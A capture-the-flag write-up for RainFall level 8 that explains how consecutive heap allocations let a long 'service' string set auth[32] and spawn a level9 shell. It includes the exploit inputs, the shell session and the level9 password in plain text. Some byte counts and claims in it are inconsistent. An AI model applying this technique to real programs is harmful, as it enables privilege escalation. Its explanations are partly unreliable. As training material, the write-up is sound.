# Level 8 - Heap Memory Layout Exploitation

## Code Analysis

### Program Structure

The `main` function implements a command-line interface with four available commands:

1. **auth [data]** - Authenticates with user data
2. **service [data]** - Sets a service name
3. **reset** - Resets authentication
4. **login** - Attempts to log in

### Command Breakdown

#### auth Command
- Calls `malloc()` to allocate heap memory
- Uses `strcpy()` to copy data following "auth" into the global variable `auth`

#### service Command
- Calls `strdup()` to duplicate the string
- Copies data following "service" into the global variable `service`

#### reset Command
- Calls `free()` to deallocate the global `auth` pointer

#### login Command
- Checks if `auth[32]` is not zero
- If true: calls `system()` to spawn a shell
- If false: calls `fwrite()` and displays addresses of `auth` and `service`

### The Winning Condition

The program spawns a shell only if the value at offset 32 bytes from the `auth` pointer is non-zero.

## Understanding Heap Memory Layout

### Memory Allocation Behavior

When using `malloc()`, the allocator places consecutive allocations adjacent to each other in heap memory with minimal padding.

### Observing the Layout

By executing:
```
auth 
service test
login
```

The output displays the addresses of both global pointers, revealing they are separated by **16 bytes**.

This is because `malloc()` aligns allocations and adds metadata, resulting in predictable spacing between consecutive heap allocations.

## Exploitation Strategy

### Memory Overlap Technique

Since `auth` and `service` are allocated sequentially with 16 bytes separation:
- `auth` starts at address X
- `service` starts at address X + 16
- We need to write data at offset X + 32

### Method 1: Single Large Service String

By providing a service string of at least 16 characters, we write beyond the `service` buffer into the memory location that corresponds to `auth[32]`:
```
auth 
service0123456789abcdef
login
```

**Explanation:**
- `auth` allocates memory and initializes the pointer
- `service0123456789abcdef` writes 24 characters (including null terminator)
- Since `service` is 16 bytes after `auth`, the 16-character payload reaches `auth[32]`
- `login` checks `auth[32]`, finds non-zero data, and spawns a shell

### Method 2: Multiple Service Allocations

Alternatively, call the service command twice to accumulate 32 bytes:
```
auth 
service test1
service test2
login
```

## Executing the Exploit
```bash
level8@RainFall:~$ ./level8
(level8) auth 
(level8) service0123456789abcdef
(level8) login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## Credentials

**Username:** level9  
**Password:** `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`

## Summary

This level demonstrates **heap memory layout exploitation**, leveraging predictable allocation patterns to influence program logic.

**Key concepts:**
- Understanding heap memory allocation with `malloc()`
- Exploiting adjacent heap allocations
- Memory alignment and padding in heap structures
- Leveraging `strdup()` and `strcpy()` for controlled writes
- Indirect memory manipulation through layout awareness
- Interactive command-based exploitation

**Critical insight:** The vulnerability doesn't rely on traditional buffer overflows or format strings. Instead, it exploits the predictable nature of heap allocation to write controlled data at specific offsets, demonstrating that understanding memory layout is as important as identifying vulnerable functions.